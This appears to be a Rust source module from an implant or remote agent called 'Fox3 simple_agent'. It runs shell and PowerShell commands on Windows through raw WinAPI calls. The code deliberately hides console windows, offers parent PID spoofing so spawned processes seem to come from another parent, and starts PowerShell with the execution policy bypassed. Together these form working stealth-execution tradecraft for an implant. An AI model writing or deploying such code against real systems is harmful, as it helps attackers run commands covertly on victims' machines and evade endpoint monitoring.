/// WinAPI-based command execution for Fox3 simple_agent.
///
/// Uses `CreateProcessW` with anonymous pipe redirection instead of the
/// standard library's `Command::new()`.  This gives full control over:
/// - `dwCreationFlags`: `CREATE_NO_WINDOW` to avoid visible console windows
/// - Parent PID spoofing via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`
/// - Direct Win32 handle management
///
/// On non-Windows targets the functions fall through to `std::process::Command`.

/// Execute a command with arguments.
/// Returns (stdout, stderr) as UTF-8 strings (lossy decoding).
pub fn exec(cmd: &str, args: &[String]) -> (String, String) {
    exec_with_ppid(cmd, args, 0)
}

/// Execute with optional PPID spoofing.
/// `ppid = 0` disables spoofing (same as `exec`).
pub fn exec_with_ppid(cmd: &str, args: &[String], ppid: u32) -> (String, String) {
    #[cfg(windows)]
    {
        match imp::exec_win(cmd, args, ppid) {
            Ok(result) => result,
            Err(e)     => (String::new(), e.to_string()),
        }
    }
    #[cfg(not(windows))]
    {
        let _ = ppid;
        exec_fallback(cmd, args)
    }
}

/// Fallback: std::process::Command (used on non-Windows or if WinAPI unavailable).
#[allow(dead_code)]
pub fn exec_fallback(cmd: &str, args: &[String]) -> (String, String) {
    match std::process::Command::new(cmd).args(args).output() {
        Ok(o) => (
            String::from_utf8_lossy(&o.stdout).into_owned(),
            String::from_utf8_lossy(&o.stderr).into_owned(),
        ),
        Err(e) => (String::new(), e.to_string()),
    }
}

/// Execute a shell command string through cmd.exe /C or sh -c.
pub fn exec_shell(command_line: &str) -> (String, String) {
    if cfg!(windows) {
        exec_with_ppid("cmd.exe", &["/C".to_string(), command_line.to_string()], 0)
    } else {
        exec_with_ppid("sh", &["-c".to_string(), command_line.to_string()], 0)
    }
}

/// Execute a PowerShell command.
pub fn exec_powershell(command_line: &str) -> (String, String) {
    let args = vec![
        "-NoLogo".to_string(),
        "-NonInteractive".to_string(),
        "-NoProfile".to_string(),
        "-ExecutionPolicy".to_string(), "Bypass".to_string(),
        "-Command".to_string(), command_line.to_string(),
    ];
    exec_with_ppid("powershell.exe", &args, 0)
}

#[cfg(windows)]
mod imp {
    use std::ffi::c_void;
    use std::ptr;

    // ── Win32 constants ───────────────────────────────────────────────────────

    const HANDLE_FLAG_INHERIT:         u32 = 0x00000001;
    const CREATE_NO_WINDOW:            u32 = 0x08000000;
    const CREATE_SUSPENDED:            u32 = 0x00000004;
    const EXTENDED_STARTUPINFO_PRESENT:u32 = 0x00080000;
    const PROCESS_ALL_ACCESS:          u32 = 0x001F_0FFF;
    const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;
    const INFINITE:                    u32 = 0xFFFF_FFFF;

    // ── Win32 structures ──────────────────────────────────────────────────────

    #[repr(C)]
    #[derive(Default)]
    struct SecurityAttributes {
        n_length: u32,
        lp_security_descriptor: *mut c_void,
        b_inherit_handle: i32,
    }

    #[repr(C)]
    #[derive(Default)]
    struct StartupInfoW {
        cb:                u32,
        _reserved:         *mut u16,
        _desktop:          *mut u16,
        _title:            *mut u16,
        _x: u32, _y: u32, _x_size: u32, _y_size: u32,
        _x_count_chars: u32, _y_count_chars: u32,
        _fill_attr: u32,
        dw_flags:          u32,
        w_show_window:     u16,
        _reserved2:        u16,
        _reserved3:        *mut u8,
        h_std_input:  *mut c_void,
        h_std_output: *mut c_void,
        h_std_error:  *mut c_void,
    }

    #[repr(C)]
    struct StartupInfoExW {
        startup_info:    StartupInfoW,
        lp_attr_list:    *mut c_void,
    }

    #[repr(C)]
    #[derive(Default)]
    struct ProcessInformation {
        h_process:   *mut c_void,
        h_thread:    *mut c_void,
        dw_pid:      u32,
        dw_tid:      u32,
    }

    // ── Win32 FFI ─────────────────────────────────────────────────────────────

    extern "system" {
        fn CreatePipe(
            read: *mut *mut c_void, write: *mut *mut c_void,
            attrs: *mut SecurityAttributes, size: u32,
        ) -> i32;
        fn SetHandleInformation(handle: *mut c_void, mask: u32, flags: u32) -> i32;
        fn CreateProcessW(
            app: *const u16, cmd: *mut u16,
            proc_attrs: *mut SecurityAttributes, thread_attrs: *mut SecurityAttributes,
            inherit: i32, flags: u32, env: *mut c_void,
            cwd: *const u16, si: *mut c_void, pi: *mut ProcessInformation,
        ) -> i32;
        fn WaitForSingleObject(h: *mut c_void, ms: u32) -> u32;
        fn CloseHandle(h: *mut c_void) -> i32;
        fn ReadFile(
            h: *mut c_void, buf: *mut u8, n: u32,
            read: *mut u32, overlapped: *mut c_void,
        ) -> i32;
        fn OpenProcess(access: u32, inherit: i32, pid: u32) -> *mut c_void;
        fn InitializeProcThreadAttributeList(
            list: *mut c_void, count: u32, flags: u32, size: *mut usize,
        ) -> i32;
        fn UpdateProcThreadAttribute(
            list: *mut c_void, flags: u32, attr: usize,
            value: *mut c_void, size: usize,
            prev: *mut c_void, return_size: *mut usize,
        ) -> i32;
        fn DeleteProcThreadAttributeList(list: *mut c_void);
        fn ResumeThread(h: *mut c_void) -> u32;
        fn GetLastError() -> u32;
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    fn to_wide(s: &str) -> Vec<u16> {
        let mut v: Vec<u16> = s.encode_utf16().collect();
        v.push(0);
        v
    }

    fn build_cmdline(cmd: &str, args: &[String]) -> Vec<u16> {
        let mut s = String::new();
        s.push('"');
        s.push_str(cmd);
        s.push('"');
        for a in args {
            s.push(' ');
            if a.contains(' ') {
                s.push('"');
                s.push_str(a);
                s.push('"');
            } else {
                s.push_str(a);
            }
        }
        to_wide(&s)
    }

    fn drain_pipe(h: *mut c_void) -> Vec<u8> {
        let mut out = Vec::new();
        let mut buf = [0u8; 4096];
        loop {
            let mut n = 0u32;
            let ok = unsafe { ReadFile(h, buf.as_mut_ptr(), buf.len() as u32, &mut n, ptr::null_mut()) };
            if ok == 0 || n == 0 { break; }
            out.extend_from_slice(&buf[..n as usize]);
        }
        out
    }

    // ── Main execution function ───────────────────────────────────────────────

    pub fn exec_win(cmd: &str, args: &[String], ppid: u32) -> anyhow::Result<(String, String)> {
        unsafe {
            // Create anonymous pipes for stdout and stderr
            let mut stdout_r: *mut c_void = ptr::null_mut();
            let mut stdout_w: *mut c_void = ptr::null_mut();
            let mut stderr_r: *mut c_void = ptr::null_mut();
            let mut stderr_w: *mut c_void = ptr::null_mut();
            let mut sa = SecurityAttributes { n_length: std::mem::size_of::<SecurityAttributes>() as u32, b_inherit_handle: 1, ..Default::default() };

            if CreatePipe(&mut stdout_r, &mut stdout_w, &mut sa, 0) == 0 ||
               CreatePipe(&mut stderr_r, &mut stderr_w, &mut sa, 0) == 0 {
                anyhow::bail!("exec: CreatePipe failed ({})", GetLastError());
            }
            // The read ends must NOT be inherited by the child
            SetHandleInformation(stdout_r, HANDLE_FLAG_INHERIT, 0);
            SetHandleInformation(stderr_r, HANDLE_FLAG_INHERIT, 0);

            // Build STARTUPINFOEX (supports attribute list for PPID spoofing)
            let use_ppid = ppid != 0;
            let mut attr_list_buf: Vec<u8> = Vec::new();
            let mut hp_parent: *mut c_void = ptr::null_mut();

            let flags;
            let si_ptr: *mut c_void;
            let mut si_ex: StartupInfoExW;
            let mut si_plain: StartupInfoW;

            if use_ppid {
                hp_parent = OpenProcess(PROCESS_ALL_ACCESS, 0, ppid);
                if hp_parent.is_null() {
                    anyhow::bail!("exec: OpenProcess(ppid={}) failed ({})", ppid, GetLastError());
                }
                // Query required attribute list size
                let mut attr_size = 0usize;
                InitializeProcThreadAttributeList(ptr::null_mut(), 1, 0, &mut attr_size);
                attr_list_buf.resize(attr_size, 0);
                let list_ptr = attr_list_buf.as_mut_ptr() as *mut c_void;
                if InitializeProcThreadAttributeList(list_ptr, 1, 0, &mut attr_size) == 0 {
                    CloseHandle(hp_parent);
                    anyhow::bail!("exec: InitializeProcThreadAttributeList failed ({})", GetLastError());
                }
                UpdateProcThreadAttribute(
                    list_ptr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    &mut hp_parent as *mut _ as *mut c_void,
                    std::mem::size_of::<*mut c_void>(),
                    ptr::null_mut(), ptr::null_mut(),
                );
                si_ex = StartupInfoExW {
                    startup_info: build_si(stdout_w, stderr_w),
                    lp_attr_list: list_ptr,
                };
                flags = CREATE_NO_WINDOW | CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT;
                si_ptr = &mut si_ex as *mut _ as *mut c_void;
            } else {
                si_plain = build_si(stdout_w, stderr_w);
                flags = CREATE_NO_WINDOW;
                si_ptr = &mut si_plain as *mut _ as *mut c_void;
            }

            let mut cmdline = build_cmdline(cmd, args);
            let mut pi = ProcessInformation::default();

            let ok = CreateProcessW(
                ptr::null(), cmdline.as_mut_ptr(),
                ptr::null_mut(), ptr::null_mut(),
                1, flags, ptr::null_mut(), ptr::null(),
                si_ptr, &mut pi,
            );

            // Close write ends in parent — required to get EOF on read ends
            CloseHandle(stdout_w);
            CloseHandle(stderr_w);

            if ok == 0 {
                if use_ppid {
                    if !attr_list_buf.is_empty() {
                        DeleteProcThreadAttributeList(attr_list_buf.as_mut_ptr() as _);
                    }
                    CloseHandle(hp_parent);
                }
                CloseHandle(stdout_r);
                CloseHandle(stderr_r);
                anyhow::bail!("exec: CreateProcessW failed ({})", GetLastError());
            }

            if use_ppid {
                ResumeThread(pi.h_thread);
                DeleteProcThreadAttributeList(attr_list_buf.as_mut_ptr() as _);
                CloseHandle(hp_parent);
            }

            // Wait for process then drain output
            WaitForSingleObject(pi.h_process, INFINITE);
            let stdout_bytes = drain_pipe(stdout_r);
            let stderr_bytes = drain_pipe(stderr_r);

            CloseHandle(pi.h_process);
            CloseHandle(pi.h_thread);
            CloseHandle(stdout_r);
            CloseHandle(stderr_r);

            Ok((
                String::from_utf8_lossy(&stdout_bytes).into_owned(),
                String::from_utf8_lossy(&stderr_bytes).into_owned(),
            ))
        }
    }

    fn build_si(stdout_w: *mut c_void, stderr_w: *mut c_void) -> StartupInfoW {
        const STARTF_USESTDHANDLES: u32 = 0x00000100;
        let mut si = StartupInfoW::default();
        si.cb = std::mem::size_of::<StartupInfoW>() as u32;
        si.dw_flags = STARTF_USESTDHANDLES;
        si.h_std_input  = ptr::null_mut(); // no stdin
        si.h_std_output = stdout_w;
        si.h_std_error  = stderr_w;
        si
    }
}
